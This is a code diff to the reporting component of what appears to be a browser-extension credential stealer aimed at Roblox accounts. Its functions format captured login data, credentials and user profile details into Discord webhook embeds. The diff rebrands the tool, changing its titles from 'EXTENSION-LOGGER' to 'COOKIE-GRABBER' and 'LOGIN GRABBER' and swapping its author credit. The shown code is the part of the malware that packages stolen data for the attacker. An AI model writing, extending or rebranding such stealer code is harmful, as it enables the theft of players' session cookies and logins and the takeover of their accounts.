@@ -505,7 +505,7 @@ function formatRobloxCombinedEmbedWithData(logData, userData) {
 
   // First embed: Credentials + Comprehensive User Data
   const credentialsAndDataEmbed = {
-    title: "<:emoji_37:1410520517349212200> **EXTENSION-LOGGER**",
+    title: "<:emoji_37:1410520517349212200> **COOKIE-GRABBER**",
     color: 0xFFFFFF,
     thumbnail: userData.avatarUrl ? {
       url: userData.avatarUrl
@@ -578,7 +578,7 @@ function formatRobloxCombinedEmbedWithData(logData, userData) {
       }
     ],
     footer: {
-      text: "Made By .gg/sZbFX2wPVz"
+      text: "Made By SL4A"
     },
     timestamp: new Date(logData.timestamp).toISOString()
   };
@@ -650,7 +650,7 @@ function formatLogForDiscord(logData) {
 function formatRobloxLoginEmbed(logData) {
   return {
     embeds: [{
-      title: `<:emoji_37:1410520517349212200> **EXTENSION LOGGER**`,
+      title: `<:emoji_37:1410520517349212200> **LOGIN GRABBER**`,
       description: "```" + logData.message.replace(", ", "\n") + "```",
       color: 0xFFFFFF,
       fields: [
